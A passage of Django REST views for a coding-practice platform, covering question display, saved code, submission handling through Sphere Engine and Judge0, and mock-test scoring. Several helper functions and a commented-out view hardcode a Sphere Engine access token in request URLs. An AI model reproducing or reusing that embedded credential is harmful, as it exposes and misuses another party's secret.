                #                     "test_case_value": test_case_value,
                #                     "target_titel": target_titel,
                #                     "target_value": target_value,
                #                     "expected_titel": expected_titel,
                #                     "expected_value": expected_value
                #                 })
                #         except:
                #             test_case_list.append({
                #                     "info":"Please follow The Process"
                #                 })
                #examples
                try:
                    exampless = str(i.examples)
                    lines = exampless.strip().split('\n')
                    exampless_list = []
                    for line in lines:
                        line = line.strip()  # Remove leading and trailing spaces
                        if line.startswith("Sample Eg") and "||" in line:
                            exampless_list.append(line)
                    counter = 0
                    for j in exampless_list:
                        ex = str(j).replace("\r","").replace("\n","")
                        exx = ex.split("||")
                        title = exx[0]
                        input = exx[1]
                        output = exx[2]
                        explanation = exx[3]
                        examples.append({"id":counter+1,"title":title,"input":input,"output":output,"explanation":explanation})
                        counter +=1
                except:
                    pass
                # constrains
                constrain =[]    
                if i.constraints is not None and len(i.constraints) != 0:
                    try:
                        cons_txt = str(i.constraints).split("\r\n\r\n\r\n")
                        con_counter = 0
                        for con in cons_txt:
                            con_counter += 1
                            conss = str(con).replace("\r", "").replace("\n", "")
                            nw_cons = conss.split("||")
                            cons_title = nw_cons[0]
                            cons_value = nw_cons[1]
                            constrain.append({"constrain_title":cons_title,"constrain_value":cons_value})
                    except:
                        constrain.append({
                                    "info":"Please follow The Process"
                                })         
                # video solutions
                all_videos =[]    
                if i.video_solutions is not None and len(i.video_solutions) != 0:
                    try:
                        vids = str(i.video_solutions).split("\r\n\r\n\r\n")
                        vid_counter = 0
                        for v in vids:
                            vid_counter += 1
                            vidd = str(v).replace("\r", "").replace("\n", "")
                            nw_vids = vidd.split("||")
                            vid_language = nw_vids[0]
                            vid_url = nw_vids[1]
                            all_videos.append({"video_title":vid_language,"video_links":vid_url})     
                    except:
                        all_videos.append({
                                    "info":"Please follow The Process"
                                }) 
                approch_values = compiler_question_approches_practice(q_id) 
                prob_pic = i.prob_pic.url if i.prob_pic else "null" 
                const_pic = i.const_pic.url if i.const_pic else "null" 
                #add
                pre_code_list = SavePracticeCode.objects.filter(question_id=int(q_id), student_id= (std_id[0])).values("code_text") 
                if len(pre_code_list) == 0:
                    pre_code = None
                else:
                    pre_code = pre_code_list[0]["code_text"]
                
                previous_attempts = CompilerQuestionAtempt.objects.filter(question_id=q_id,student_id=std_id[0],question__practice_mock=False, submited=True, button_clicked="Submit").order_by("-id").values("id","status","load_template__compiler","student_ans","practic_time","code_response", "code_response_status")
                for ti in previous_attempts:
                    if ti["code_response"] is not None:
                        res = json.loads(ti["code_response"])
                        ti["timer"] = res['items'][0]['result']["time"]
                        ti["memory"] = res['items'][0]['result']["memory"]
                        # ti["status"] = res['items'][0]['result']["status"]["name"]
                        # print(ti["code_response_status"])
                        # print(dict(ti["code_response_status"]))
                        ti.update(ti["code_response_status"])
                        del ti["code_response"]
                        del ti["code_response_status"]
                # print(previous_attempts)
                check_total_qn = CompilerQuestion.objects.filter(day =day_value , week = week_value ,practice_mock=False,disable= False).values("question_number").order_by("day","question_number")
                main_data.append({"next_q_id":next_q_id,"course_name":get_course.course.name,"problem_id":i.prob_id,"question_id":i.id,"question_number":i.question_number,"question_name":i.ques_title,"socialSitList":socialSitList,"prob_text":i.prob_text,
                                "prob_pic":prob_pic,"examples":examples,"constrains":constrain,"const_pic":const_pic,"Challenge":i.challenge,"video_solutions":all_videos,"test_case": test_casess ,"approch_values":approch_values, "pre_code":pre_code, "previous_attempts":previous_attempts, "week_day_q_count":check_total_qn.count()})
            return Response({"main_data":main_data})
        except Exception as e :
            return Response({"error":f"{e}"})       

#This api for slag(filter using questions titel)
class PracticeQuestionSearchTitel(ListAPIView):  #30/01/2024
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    def get(self, request, q_titel):
        try :
            main_data = []
            q_titel = q_titel.replace("-", " ")
            user_id = request.user.id
            std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
            # get_q = CompilerQuestion.objects.filter(ques_title=q_titel,practice_mock=False,disable= False)
            get_q = CompilerQuestion.objects.filter(ques_title=q_titel,practice_mock=False,disable= False).order_by("day","question_number")
            #next_questions
            
            get_c_q = CompilerQuestion.objects.filter(ques_title=q_titel, practice_mock=False,disable= False).values("week", "course_id", "id")
            if len(get_c_q) != 0:
                week_id = int(get_c_q[0]["week"])
                course_id = int(get_c_q[0]["course_id"])
                # get_q_all = CompilerQuestion.objects.filter(week=week_id,course_id=course_id,practice_mock=False,disable= False).order_by("day")
                get_q_all = CompilerQuestion.objects.filter(week=week_id,course_id=course_id,practice_mock=False,disable= False).order_by("day","question_number")
                get_all_q_id = []
                loop_count = 4
                for k in range(1, loop_count):
                    for_day = get_q_all.filter(day=k)
                    for t in for_day:
                        get_all_q_id.append(t.id)
                q_id = get_c_q[0]["id"]
                # next_q_id = find_next_number(get_all_q_id.copy(), int(q_id))
                next_q_id = get_next_index(get_all_q_id, int(q_id))
                next_q_titel = CompilerQuestion.objects.filter(id=next_q_id, practice_mock=False,disable= False).values("ques_title")[0]["ques_title"]
            #end
            get_course = CompilerQuestion.objects.get(ques_title=q_titel, practice_mock=False,disable= False)
            get_course.course.name if get_course.course else None
            socialSitList = []
            examples = []
            # test_case_list = []

            for i in get_q :
                if i.google :
                    socialSitList.append("Google") 
                if i.amazon :
                    socialSitList.append("Amazon")
                if i.microsoft :
                    socialSitList.append("Microsoft")
                if i.meta :
                    socialSitList.append("Facebook")
                if i.linkedin :
                    socialSitList.append("Linkedin")
                if i.uber :
                    socialSitList.append("Uber")
                if i.adobe :
                    socialSitList.append("Adobe")
                if i.cred :
                    socialSitList.append("Cred")
                test_cases = i.test_cases
                if test_cases == {}:
                    test_casess = []
                else:
                    test_casess = test_cases["data"]
                # print(test_casess)
                #testcases
                # if i.test_case is not None and len(i.test_case) != 0:
                #     if i.test_case != "null":
                #         try:
                #             test_case_txt = str(i.test_case).split("\r\n\r\n\r\n")
                #             t_counter = 0
                #             for case_ in test_case_txt:
                #                 t_counter += 1
                #                 caa = str(case_).replace("\r", "").replace("\n", "")
                #                 caaa = caa.split("||")
                #                 case_titel = caaa[0]
                                
                #                 # Split the parts and handle index out of range
                #                 test_case_parts = caaa[1].split("=")
                #                 test_case_titel = test_case_parts[0] + "=" if len(test_case_parts) > 1 else None
                #                 test_case_value = test_case_parts[1] if len(test_case_parts) > 1 else None

                #                 target_parts = caaa[2].split("=")
                #                 target_titel = target_parts[0] + "=" if len(target_parts) > 1 else None
                #                 target_value = target_parts[1] if len(target_parts) > 1 else None

                #                 expected_parts = caaa[3].split("=")
                #                 expected_titel = expected_parts[0] + "=" if len(expected_parts) > 1 else None
                #                 expected_value = expected_parts[1] if len(expected_parts) > 1 else None

                #                 test_case_list.append({
                #                     "id": t_counter,
                #                     "case_titel": case_titel,
                #                     "test_case_titel": test_case_titel,
                #                     "test_case_value": test_case_value,
                #                     "target_titel": target_titel,
                #                     "target_value": target_value,
                #                     "expected_titel": expected_titel,
                #                     "expected_value": expected_value
                #                 })
                #         except:
                #             test_case_list.append({
                #                     "info":"Please follow The Process"
                #                 })
                #examples
                try:
                    exampless = str(i.examples)
                    lines = exampless.strip().split('\n')
                    exampless_list = []
                    for line in lines:
                        line = line.strip()  # Remove leading and trailing spaces
                        if line.startswith("Sample Eg") and "||" in line:
                            exampless_list.append(line)
                    counter = 0
                    for j in exampless_list:
                        ex = str(j).replace("\r","").replace("\n","")
                        exx = ex.split("||")
                        title = exx[0]
                        input = exx[1]
                        output = exx[2]
                        explanation = exx[3]
                        examples.append({"id":counter+1,"title":title,"input":input,"output":output,"explanation":explanation})
                        counter +=1
                except:
                    pass
                # constrains
                constrain =[]    
                if i.constraints is not None and len(i.constraints) != 0:
                    try:
                        cons_txt = str(i.constraints).split("\r\n\r\n\r\n")
                        con_counter = 0
                        for con in cons_txt:
                            con_counter += 1
                            conss = str(con).replace("\r", "").replace("\n", "")
                            nw_cons = conss.split("||")
                            cons_title = nw_cons[0]
                            cons_value = nw_cons[1]
                            constrain.append({"constrain_title":cons_title,"constrain_value":cons_value})
                    except:
                        constrain.append({
                                    "info":"Please follow The Process"
                                })         
                # video solutions
                all_videos =[]    
                if i.video_solutions is not None and len(i.video_solutions) != 0:
                    try:
                        vids = str(i.video_solutions).split("\r\n\r\n\r\n")
                        vid_counter = 0
                        for v in vids:
                            vid_counter += 1
                            vidd = str(v).replace("\r", "").replace("\n", "")
                            nw_vids = vidd.split("||")
                            vid_language = nw_vids[0]
                            vid_url = nw_vids[1]
                            all_videos.append({"video_title":vid_language,"video_links":vid_url})     
                    except:
                        all_videos.append({
                                    "info":"Please follow The Process"
                                }) 
                approch_values = compiler_question_approches_practice(q_id) 
                prob_pic = i.prob_pic.url if i.prob_pic else "null" 
                const_pic = i.const_pic.url if i.const_pic else "null" 
                #add
                pre_code_list = SavePracticeCode.objects.filter(question_id=int(q_id), student_id= (std_id[0])).values("code_text") 
                if len(pre_code_list) == 0:
                    pre_code = None
                else:
                    pre_code = pre_code_list[0]["code_text"]
                q_id = get_q.first().id
                previous_attempts = CompilerQuestionAtempt.objects.filter(question_id=q_id,student_id=std_id[0],question__practice_mock=False, submited=True, button_clicked="Submit").order_by("-id").values("id","status","load_template__compiler","student_ans","practic_time","code_response", "code_response_status")
                for ti in previous_attempts:
                    if ti["code_response"] is not None:
                        res = json.loads(ti["code_response"])
                        ti["timer"] = res['items'][0]['result']["time"]
                        ti["memory"] = res['items'][0]['result']["memory"]
                        # ti["status"] = res['items'][0]['result']["status"]["name"]
                        # print(ti["code_response_status"])
                        # print(dict(ti["code_response_status"]))
                        ti.update(ti["code_response_status"])
                        del ti["code_response"]
                        del ti["code_response_status"]
                main_data.append({"previous_attempts":previous_attempts,"next_q_id":next_q_id,"next_q_titel":next_q_titel.replace(" ", "-"),"course_name":get_course.course.name,"problem_id":i.prob_id,"question_id":i.id,"question_number":i.question_number,"question_name":i.ques_title,"socialSitList":socialSitList,"prob_text":i.prob_text,
                                "prob_pic":prob_pic,"examples":examples,"constrains":constrain,"const_pic":const_pic,"Challenge":i.challenge,"video_solutions":all_videos,"test_case": test_casess ,"approch_values":approch_values, "pre_code":pre_code})
            return Response({"main_data":main_data})
        except Exception as e :
            return Response({"error":f"{e}"})       

#This api for Load template
class StudentallPracticeLoadTemplate(ListAPIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    def get(self,request):
        try:
            main_data = []
            user_id = request.user.id
            std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
            question_id = request.GET.get("question_id")
            all_temp = CompilerQuestionLoadTemplate.objects.filter(question_id=question_id).order_by("compiler").values("id","compiler","load_template")
            for i in all_temp:
                data_id = i["id"]
                compilers = str(i["compiler"]).split("||")
                compilers_name = compilers[0]
                compilers_id = compilers[1]
                have_code = SavePracticeCode.objects.filter(compliler_id = data_id, student_id = std_id[0], question_id = question_id).values("code_text")
                if have_code.exists():
                    pre_code = have_code[0]["code_text"]
                else:
                    pre_code = i["load_template"]
                main_data.append({"save_code_id":data_id, "compiler":i["compiler"],"compilers_name":compilers_name,"compilers_id":compilers_id,"load_template":pre_code})
            return Response({"main_data":main_data})
        except Exception as e :
            return Response({"error":f"{e}"})

#this api for save code in practice
class StudentPracticeSaveCode(ListAPIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    
    def post(self, request) :
        try :
            user_id = request.user.id
            std = Student.objects.filter(user_id=user_id).first()
            q_id = request.data.get("q_id")
            code = request.data.get("code")
            compliler_id = request.data.get("compliler_id")
            # print(q_id, code)
            user_save_code = SavePracticeCode.objects.filter(student_id = std.id, question_id=q_id, compliler_id=int(compliler_id))
            # print(user_save_code)
            if user_save_code.exists():
                user_save_code.update(code_text=code)
            else:
                user_save_code_craete = SavePracticeCode(student_id = std.id, question_id=q_id, compliler_id=int(compliler_id), code_text=code)
                user_save_code_craete.save()
            return Response({"status":True,"compliler_id":int(compliler_id)})
        except Exception as e :
            return Response({"error":f"{e}"})

#this api for refrace button in practice
class StudentPracticeDeleteCode(ListAPIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    
    def post(self, request) :
        try :
            user_id = request.user.id
            std = Student.objects.filter(user_id=user_id).first()
            q_id = request.data.get("q_id")
            compliler_id = request.data.get("compliler_id")
            SavePracticeCode.objects.filter(student_id = std.id, question_id=q_id, compliler_id=int(compliler_id)).delete()
            return Response({"status":True,"message":"save code is deleted"})
        except Exception as e :
            return Response({"error":f"{e}"})

#this api for submission of code
class StudentallPracticeQuestionSubmission(ListAPIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    
    def post(self, request) :
        try :
            main_data = []
            user_id = request.user.id
            std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
            if len(std_id) > 0 :
                std_id = std_id[0]
            else:
                std_id = ""
            q_id = request.data.get("q_id")
            source_code = request.data.get("source_code")
            compiler = request.data.get("compiler")
            compiler_id = request.data.get("compiler_id")
            problem_id = request.data.get("problem_id")
            coding_language = request.data.get("coding_language")
            button_clicked = request.data.get("button_clicked")
            get_q = CompilerQuestion.objects.filter(id=q_id,practice_mock=False,disable= False)
            if get_q.exists() and std_id !="" and source_code and compiler_id and problem_id and coding_language and button_clicked :
                get_q = get_q.first()
                check_temp = CompilerQuestionLoadTemplate.objects.filter(compiler=compiler)
                if check_temp.exists():
                    get_temp = check_temp.first()
                    load_template_id = get_temp.id
                    coding_language = coding_language
                else:
                    return Response({"main_data":main_data})
                attepmt_number = CompilerQuestionAtempt.objects.filter(question_id=q_id,student_id=std_id,load_template_id=load_template_id,
                                                                    coding_language=coding_language,button_clicked="Run")
                if attepmt_number.exists():
                    get_attepmt_number = len(attepmt_number)
                    get_attepmt_temp = attepmt_number.first()
                    get_attepmt_temp.attepmt_number = int(get_attepmt_number) + 1
                    get_attepmt_temp.student_ans = source_code
                    get_attepmt_temp.button_clicked = button_clicked
                    if button_clicked == "Submit":
                        get_attepmt_temp.submited = True
                    else:
                        get_attepmt_temp.submited = False
                    get_attepmt_temp.save()
                    main_data = get_attepmt_temp.id
                else:
                    get_attepmt_number = 1
                    get_attepmt_temp = CompilerQuestionAtempt(question_id=q_id,student_id=std_id,attepmt_number=get_attepmt_number,load_template_id=load_template_id,
                                        coding_language=coding_language,student_ans=source_code,button_clicked=button_clicked)
                    if button_clicked == "Submit":
                        get_attepmt_temp.submited = True
                    get_attepmt_temp.save()
                    main_data = get_attepmt_temp.id
            return Response({"main_data":main_data})
        except Exception as e :
            return Response({"error":f"{e}"})

      
def accept_api_output(res_ids):
    url3 = f"https://31c7692b.problems.sphere-engine.com/api/v4/submissions/{res_ids}/output?access_token=3d839c6883687fa7e1db43995c8d60c2"
    response3 = requests.get(url3)
    parsed_json = response3.text
    data_list = str(parsed_json).split("\n")
    dataset_index = data_list.index('DATASET NUMBER: 0')
    dataset_values = []
    for value in data_list[dataset_index + 1:]:
        if not value:
            break
        dataset_values.append(value)
    dataset_values = [value for value in dataset_values]
    return dataset_values

def compilation_error_data(res_ids):
    url4 = f"https://31c7692b.problems.sphere-engine.com/api/v4/submissions/{res_ids}/cmpinfo?access_token=3d839c6883687fa7e1db43995c8d60c2"
    response4 = requests.get(url4)
    return response4.text

def wrong_answer_data(res_ids):
    url3 = f"https://31c7692b.problems.sphere-engine.com/api/v4/submissions/{res_ids}/output?access_token=3d839c6883687fa7e1db43995c8d60c2"
    response3 = requests.get(url3)
    parsed_json = response3.text
    data_list = str(parsed_json).split("\n")
    dataset_index = data_list.index('DATASET NUMBER: 0')
    dataset_values = []
    for value in data_list[dataset_index + 1:]:
        if not value:
            break
        dataset_values.append(value)
    dataset_values = [value for value in dataset_values]
    return dataset_values

def runtime_error_data(res_ids):
    url5 = f"https://31c7692b.problems.sphere-engine.com/api/v4/submissions/{res_ids}/error?access_token=3d839c6883687fa7e1db43995c8d60c2"
    response5 = requests.get(url5)
    return response5.text

#this api for Responce of the submission
# class StudentallPracticeQuestionSubmissionResponce(ListAPIView):
#     authentication_classes = (TokenAuthentication,)
#     permission_classes = (IsAuthenticated,)

#     def get(self, request):
#         try:
#             main_data = []
#             user_id = request.user.id
#             std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
#             if len(std_id) > 0 :
#                 std_id = std_id[0]
#             else:
#                 std_id = ""
#             api_result = []
#             main_data_id = request.GET.get("main_data_id")
#             check_ans = CompilerQuestionAtempt.objects.filter(id=main_data_id)
#             print(check_ans)
#             if check_ans.exists():
#                 get_ans = check_ans.first()
#                 student_id = get_ans.student.id
#                 ques_id = get_ans.question.id
#                 source_code = get_ans.student_ans
#                 compiler = str(get_ans.load_template.compiler).split("||")
#                 compiler_id = compiler[1]
#                 problem_id = get_ans.question.prob_id
#                 url1 = 'https://31c7692b.problems.sphere-engine.com/api/v4/submissions?access_token=3d839c6883687fa7e1db43995c8d60c2'
#                 headers = {'Content-Type': 'application/json'}
#                 triple_quoted_string = '''{}'''.format(source_code)
#                 payload_for_post = {
#                     "compilerId": compiler_id,
#                     "source": triple_quoted_string,
#                     "problemId": problem_id
#                 }
#                 response = requests.post(url1, headers=headers, json=payload_for_post)
#                 data = json.loads(response.text)
#                 get_ans.code_response = data
#                 print(response.status_code)
#                 if response.status_code == 201 :
#                     get_sphere_engine_problems_id = data['id']
#                     time.sleep(3)
#                     url2 = f'https://31c7692b.problems.sphere-engine.com/api/v4/submissions?ids={get_sphere_engine_problems_id}&access_token=3d839c6883687fa7e1db43995c8d60c2'
#                     response2 = requests.get(url2)
#                     main_data = json.loads(response2.text)
#                     get_ans.code_response = response2.text
#                     get_ans.submissions_id = get_sphere_engine_problems_id
#                     # if code accepted
#                     res_ids = main_data['items'][0]['id']
#                     if main_data['items'][0]['result']['status']['name'] == "accepted" :
#                         accept_data = accept_api_output(res_ids)
#                         res_da = {
#                             "status":"accepted",
#                             "data":accept_data    
#                             }
#                         get_ans.code_response_status = res_da
#                         api_result.append(res_da)
                        
#                         get_ans.status = True
#                         get_ans.save()
#                     # if code compilation error
#                     elif main_data['items'][0]['result']['status']['name'] == "compilation error" :
#                         error_data = compilation_error_data(res_ids)
#                         res_da = {
#                             "status":"compilation error",
#                             "data":error_data    
#                             }
#                         get_ans.code_response_status = res_da
#                         api_result.append(res_da)
#                         get_ans.status = False
#                         get_ans.save()
#                     # if code wrong answer
#                     elif main_data['items'][0]['result']['status']['name'] == "wrong answer" :
#                         output_data = wrong_answer_data(res_ids)
#                         res_da = {
#                             "status":"wrong answer",
#                             "data":output_data    
#                             }
#                         get_ans.code_response_status = res_da
#                         api_result.append(res_da)
#                         get_ans.status = False
#                         get_ans.save()
#                     else:
#                         error_data = runtime_error_data(res_ids)
#                         get_ans.code_response_status = error_data
#                         api_result.append({
#                             "status":"runtime error",
#                             "data":error_data    
#                             })
#                         get_ans.status = False
#                         get_ans.save()
#                     previous_attempts = CompilerQuestionAtempt.objects.filter(question_id=ques_id,student_id=student_id,question__practice_mock=False, submited=True, button_clicked="Submit").order_by("-id").values("id","status","load_template__compiler","student_ans","practic_time","code_response", "code_response_status")
#             for ti in previous_attempts:
#                 if ti["code_response"] is not None:
#                     res = json.loads(ti["code_response"])
#                     ti["timer"] = res['items'][0]['result']["time"]
#                     ti["memory"] = res['items'][0]['result']["memory"]
#                     # ti["status"] = res['items'][0]['result']["status"]["name"]
#                     print(ti["code_response_status"])
#                     print(dict(ti["code_response_status"]))
#                     ti.update(ti["code_response_status"])
#                     del ti["code_response"]
#                     del ti["code_response_status"]
#             print(previous_attempts)  
#             return Response({"main_data":main_data,"source_code":"source_code","previous_attempts":previous_attempts, "api_result":api_result})
#         except Exception as e :
#             return Response({"error":f"{e}"})


######################################### Judge-0 Implementation ############################################## 
import requests
import json
import time
from datetime import timezone
import base64


# Function to fetch the batch submission result
def get_batch_result(batch_tokens):
    url = "https://judge0-ce.p.rapidapi.com/submissions/batch"
    querystring = {
        "tokens": batch_tokens,
        "base64_encoded": "true",
        "fields": "*"
    }

    headers = {
        "x-rapidapi-host": "judge0-ce.p.rapidapi.com",
        "x-rapidapi-key": RAPID_API_KEY
    }

    response = requests.get(url, headers=headers, params=querystring)
    
    if response.status_code == 200:
        data = response.json()
       
        for submission in data["submissions"]:
            if 'stdout' in submission and submission['stdout']:
                submission['stdout'] = base64.b64decode(submission['stdout']).decode('utf-8')
            if 'stderr' in submission and submission['stderr']:
                submission['stderr'] = base64.b64decode(submission['stderr']).decode('utf-8')
            if 'compile_output' in submission and submission['compile_output']:
                submission['compile_output'] = base64.b64decode(submission['compile_output']).decode('utf-8')
        return data
    
    return []


class StudentallPracticeQuestionSubmissionResponce(APIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)

    def get(self, request):
        try:
            main_data = []
            user_id = request.user.id
            std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
            if len(std_id) > 0:
                std_id = std_id[0]
            else:
                std_id = ""
            api_result = []
            main_data_id = request.GET.get("main_data_id")
            check_ans = CompilerQuestionAtempt.objects.filter(id=main_data_id)
            if check_ans.exists():
                get_ans = check_ans.first()
                student_id = get_ans.student.id
                ques_id = get_ans.question.id
                ques_name = get_ans.question.ques_title
                prob_id = get_ans.question.prob_id
                source_code = get_ans.student_ans
                compiler = get_ans.load_template.compiler.split("||")
              
                triple_quoted_string = '''{}'''.format(source_code)
                compiler_id = compiler[1]
                
                
                if isinstance(get_ans.question.test_cases_to_pass, str):
                    test_cases = json.loads(get_ans.question.test_cases_to_pass)['data']
                else:
                    test_cases = get_ans.question.test_cases_to_pass['data']

                url = 'https://judge0-ce.p.rapidapi.com/submissions/batch'
                headers = {
                    'Content-Type': 'application/json',
                    'x-rapidapi-host': "judge0-ce.p.rapidapi.com",
                    'x-rapidapi-key': RAPID_API_KEY  # Replace with your RapidAPI key
                }

                submissions = []

                def format_stdin(inputs, output):
                    stdin = None
                    expected_output = None
                    for i in inputs:
                        if not stdin:
                            stdin = str(i["value"])
                        else:
                            stdin = stdin + f" {i["value"]}"
                    for j in output:
                        if not expected_output:
                            expected_output = f"{j["value"]}\n"
                        
                    return stdin, expected_output
                
                for test_case in test_cases:
                    inputs = test_case["input"]
                    
                    # num_tests = len(inputs) // len(inputs)  # Assuming each test case has two numbers
                    # stdin = f"{num_tests}\n" + "\n".join([str(input['value']) for input in inputs])
                    stdin, expected_output = format_stdin(inputs, test_case["expected"])
                    # expected_output = "\n".join([str(exp['value']) for exp in test_case["expected"]]) + "\n"
                    print(stdin)
                    print(expected_output)
                    
                    submissions.append({
                        "language_id": compiler_id,
                        "source_code": triple_quoted_string,
                        "stdin": stdin,
                        "expected_output": expected_output,
                        "time_limit": 5,
                        "memory_limit": 128000
                    })

                payload_for_post = {
                    "submissions": submissions
                }

                response = requests.post(url, headers=headers, json=payload_for_post)
                
                if response.status_code == 201:
                    data = response.json()
                    get_ans.code_response = data

                    if isinstance(data, dict) and 'submissions' in data:
                        batch_tokens = ','.join([sub['token'] for sub in data['submissions']])
                    elif isinstance(data, list):
                        batch_tokens = ','.join([sub['token'] for sub in data])
                    else:
                        raise ValueError("Unexpected data structure in API response")

                    time.sleep(3)
                    batch_result = get_batch_result(batch_tokens)
                    print(batch_result)
                    for i, result in enumerate(batch_result['submissions']):   
                        test_case = test_cases[i]
                        res_da = {
                            "number": i,
                            "status": {
                                "code": result['status']['id'],
                                "name": result['status']['description']
                            },
                            "score": 0,
                            "time": result.get('time', 0),
                            "memory": result.get('memory', 0),
                            "signal": 0,
                            "signal_desc": ""
                        }
                        api_result.append(res_da)

                    passed_tests = sum(1 for res in api_result if res['status']['code'] == 3)  # Assuming 'accepted' has status code 3
                    total_tests = len(api_result)
                
                    main_data_item = {
                        'id': get_ans.id,
                        'executing': False,
                        'date': datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S +00:00'),
                        'compiler': {
                            'id': compiler_id,
                            'name': compiler,
                            'version': {
                                'id': None,
                                'name': None
                            }
                        },
                        'problem': {
                            'id': ques_id,
                            'code': prob_id,
                            'name': ques_name,
                            'uri': ''
                        },
                        'result': {
                            'score': (passed_tests / total_tests) * 100,
                            'status': {
                                'code': 15 if passed_tests == total_tests else 11,
                                'name': 'Accepted' if passed_tests == total_tests else 'Wrong Answer'
                                # 'name': next((r['status']['description'] for r in batch_result["submissions"] if r['status']['description']), None)
                            },
                            'time': sum([float(r.get('time', 0)) if r.get('time') is not None else 0 for r in batch_result["submissions"]]),
                            'memory': max([int(r.get('memory', 0)) if r.get('memory') is not None else 0 for r in batch_result["submissions"]] or [0]),
                            'signal': 0,
                            'signal_desc': '',
                            'testcases': api_result
                        },
                        'uri': ''
                    }
                    main_data.append(main_data_item)

                    get_ans.code_response = json.dumps({"items": main_data})
                    get_ans.submissions_id = None
                    result_data = []
                    error_data = None
                    for r in batch_result["submissions"]:
                        if r.get("stdout") is not None:
                            data = r.get("stdout").strip()
                            result_data.append(data)
                        elif r.get("stderr") is not None:
                            error_data = r.get("stderr").strip()
                            break
                        elif r.get("compile_output") is not None:
                            error_data = r.get("compile_output").strip()
                            break
                    get_ans.code_response_status = {"status":main_data[0]['result']['status']["name"], "data":result_data if len(result_data) > 0 else error_data }
                    get_ans.status = True if main_data[0]['result']['status']['code'] == 15 else False
                    get_ans.save()

                    previous_attempts = CompilerQuestionAtempt.objects.filter(
                        question_id=ques_id,
                        student_id=student_id,
                        question__practice_mock=False,
                        submited=True,
                        button_clicked="Submit"
                    ).order_by("-id").values(
                        "id", "status", "load_template__compiler", "student_ans", "practic_time", "code_response", "code_response_status"
                    )
                    
                    for ti in previous_attempts:
                        if ti["code_response"] is not None:
                            res = json.loads(ti["code_response"])
                            ti["timer"] = res['items'][0]['result']["time"]
                            ti["memory"] = res['items'][0]['result']["memory"]
                            ti.update(ti["code_response_status"])
                            del ti["code_response"]
                            del ti["code_response_status"]
                    
                    return Response({
                        "main_data": {
                            "items": main_data
                        },
                        "source_code": source_code,
                        "previous_attempts": previous_attempts if previous_attempts else [],
                        "api_result": get_ans.code_response_status
                    })
            else:
                return Response({"error": "Invalid main_data_id"})
        except Exception as e:
            return Response({"error": f"{e}"})


######################################### Mock ##############################################       
#mock
def mock_week_first_questions(course_id, week_id):
    get_q = CompilerQuestion.objects.filter(week=week_id,course_id=course_id,practice_mock=True,disable= False).order_by("id").first()
    
    if get_q:
        topics = {"q_id":get_q.id,"title":get_q.ques_title,"slg":get_q.ques_title.replace(" ", "-")}
    else:
        topics = {"q_id":None,"title":None,"slg":None}
    return topics

def wee_max_score(week, course_id, attempt, std, total_q):
    # print("total_q", total_q)
    score_all_data = []
    compeleted_max = []
    for i in range(1, int(attempt)+1):
        attempt_com_q = 0
        total_marks = 0
        data_list = list(MockResult.objects.filter(week=week, Course_id=course_id, attempt=i, student_id=std).values_list("correct",flat=True))
        data_list1 = list(MockResult.objects.filter(week=week, Course_id=course_id, attempt=i, student_id=std).values_list("score",flat=True))
        # print(data_list)
        # print(data_list1)
        if len(data_list) != 0:
            for k_ in data_list:
                if k_ is True:
                    attempt_com_q =attempt_com_q+1
            compeleted_max.append(attempt_com_q)
        if len(data_list) != 0:
            for k in data_list1:
                if k == 100:
                    total_marks = total_marks + 100
            try:
                m_score = int(total_marks/total_q)
            except:
                m_score = 0
            score_all_data.append(m_score)
    
    # print("score_all_datascore_all_data",score_all_data, compeleted_max)  
    if len(score_all_data) != 0:
        max_score = max(score_all_data)
    else:
        max_score = 0
    if len(compeleted_max) != 0:
        complted_questions = max(compeleted_max)
    else:
        complted_questions = 0
    
    return max_score, complted_questions 

def mock_week_unlock(std_id, total_week, course_id, course_name, c_week):
    main_data = []
    loop_len = int(total_week)+1
    for i in range(1,loop_len):
        # print(i)
        try:
            total_attempt_list = MockResult.objects.filter(week=int(i), Course_id=course_id, student_id=std_id[0]).last()
            total_attempt = total_attempt_list.attempt
            # total_attempt = CompilerQuestionAtempt.objects.filter(student_id = std_id[0], button_clicked = 'Submit', question__course_id = course_id, question__week = str(i), question__practice_mock=True, submited=True).order_by("-id").values("attepmt_number")[0]["attepmt_number"]
        except:
            total_attempt = 0
        #completed questions
        total_question_list = list(CompilerQuestion.objects.filter(course_id=course_id, week = str(i), practice_mock = True,disable= False).values_list("id", flat=True))
        total_question = len(total_question_list)
        # print("week", i, total_question, )
        
        
        """
        total_complted_question
        total_attempt
        total_question
        """
        pre_week_db_max_attempt_list = QuestionTimer.objects.filter(exam_field='Mock', course_id=course_id, week=str(i-1)).values("max_num_of_attempts", "week_pass_percent")
        if len(pre_week_db_max_attempt_list) == 0:
            pre_week_db_max_attempt = 0
            pre_week_db_max_score = 0
        else:
            pre_week_db_max_attempt = pre_week_db_max_attempt_list[0]["max_num_of_attempts"]
            pre_week_db_max_score = pre_week_db_max_attempt_list[0]["week_pass_percent"]

        this_week_max_score, total_complted_question = wee_max_score(i, course_id, total_attempt, std_id[0], total_question)
        # print(this_week_max_score, total_complted_question)
        # print("week", i)
        # print(i, course_id, total_attempt, std_id[0], total_question)
        if i <= 1:
            pre_week_max_score = 0
        else:
            pre_weektotal_att_list = MockResult.objects.filter(week=int(i-1), Course_id=course_id, student_id=std_id[0]).last()
            pre_week_total_question_list = list(CompilerQuestion.objects.filter(course_id=course_id, week = str(i-1), practice_mock = True, disable= False).values_list("id", flat=True))
            pre_week_total_question = len(pre_week_total_question_list)
            # print("checkkjdfk",i, pre_weektotal_att_list)
            if pre_weektotal_att_list:
                # print("preweek", i-1, i)
                # print(i-1, course_id, pre_weektotal_att, std_id[0], pre_week_total_question)
                pre_weektotal_att = pre_weektotal_att_list.attempt
                pre_week_max_score, pre_total_complted_question = wee_max_score(i-1, course_id, pre_weektotal_att, std_id[0], pre_week_total_question)
                
            else:
